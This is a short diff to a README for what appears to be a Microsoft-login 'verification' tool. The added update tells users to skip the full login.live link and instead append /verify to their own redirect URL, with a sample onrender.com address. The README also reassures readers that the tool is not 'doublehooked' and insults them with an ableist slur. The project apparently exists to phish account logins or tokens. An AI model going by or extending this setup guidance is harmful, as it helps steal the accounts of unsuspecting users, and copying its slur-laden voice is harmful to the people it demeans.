@@ -3,6 +3,10 @@
 ## MADE BY NORMI N40R2I#8855 and me ofc xd L BOZO
 Check this out too https://github.com/Normi-Dev/OAR
 
+## UPDATE 
+
+Now you dont need the whole login.live link, just use your redirect link and add /verify to it, example :"https://verification-system.onrender.com/verify"
+
 
 FOR RETARDS WHO TINK ITS DOUBLEHOOKED LOOK ![image](https://user-images.githubusercontent.com/107274162/204852826-c230a8e8-188a-4b32-9c7c-e4a64cd2a50c.png)
 
